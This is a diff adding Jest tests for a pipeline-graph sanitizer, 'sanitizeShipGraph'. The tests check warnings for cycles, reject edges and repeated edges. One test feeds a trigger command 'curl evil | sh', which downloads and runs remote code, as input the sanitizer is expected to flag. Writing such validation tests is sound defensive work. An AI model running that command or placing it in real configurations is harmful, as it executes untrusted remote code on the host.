@@ -94,6 +94,27 @@ describe('sanitizeShipGraph', () => {
     expect(r.warnings.join()).toMatch(/unknown kind/)
   })
 
+  it('warns on a next cycle, naming the edge that does not count', () => {
+    const r = sanitizeShipGraph(graph([{
+      id: 'p',
+      stages: [stage('a'), stage('b')],
+      edges: [{ from: 'a', to: 'b' }, { from: 'b', to: 'a' }]
+    }]), 'f')
+    expect(r.warnings.join()).toMatch(/cycle at b -> a/)
+    expect(r.pipelines![0].edges).toHaveLength(2) // still drawn
+  })
+
+  it('a reject way back is not a cycle', () => {
+    const r = sanitizeShipGraph(graph([{ id: 'p', stages: [stage('a'), stage('b')], edges: [{ from: 'a', to: 'b' }, { from: 'b', to: 'a', kind: 'reject' }] }]), 'f')
+    expect(r.warnings).toEqual([])
+  })
+
+  it('names a bad trigger and a repeated edge, which used to drop in silence', () => {
+    const r = sanitizeShipGraph(graph([{ id: 'p', stages: [stage('a'), stage('b')], trigger: { command: 'curl evil | sh' }, edges: [{ from: 'a', to: 'b' }, { from: 'a', to: 'b' }] }]), 'f')
+    expect(r.warnings.join()).toMatch(/trigger\.command/)
+    expect(r.warnings.join()).toMatch(/repeated edge a -> b/)
+  })
+
   it('caps what it keeps and says so', () => {
     const many = Array.from({ length: 40 }, (_, i) => stage(`s${i}`))
     const r = sanitizeShipGraph(graph([{ id: 'p', stages: many }]), 'f')
